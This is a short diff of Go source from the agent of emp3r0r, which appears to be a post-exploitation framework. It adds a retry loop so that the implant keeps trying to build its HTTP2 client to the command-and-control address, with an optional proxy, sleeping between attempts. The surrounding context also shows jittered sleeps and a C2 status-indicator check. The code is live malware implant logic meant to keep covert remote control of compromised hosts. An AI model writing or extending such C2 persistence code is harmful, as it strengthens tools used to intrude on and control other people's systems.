@@ -241,15 +241,20 @@ test_agent:
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
 
+connect:
 	// apply whatever proxy setting we have just added
 	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
+	if emp3r0r_data.HTTPClient == nil {
+		log.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
+		util.TakeASnap()
+		goto connect
+	}
 	if agent.RuntimeConfig.C2TransportProxy != "" {
 		log.Printf("Using proxy: %s", agent.RuntimeConfig.C2TransportProxy)
 	} else {
 		log.Println("Not using proxy")
 	}
 
-connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
 		agent.RuntimeConfig.CCIndicator != "" &&
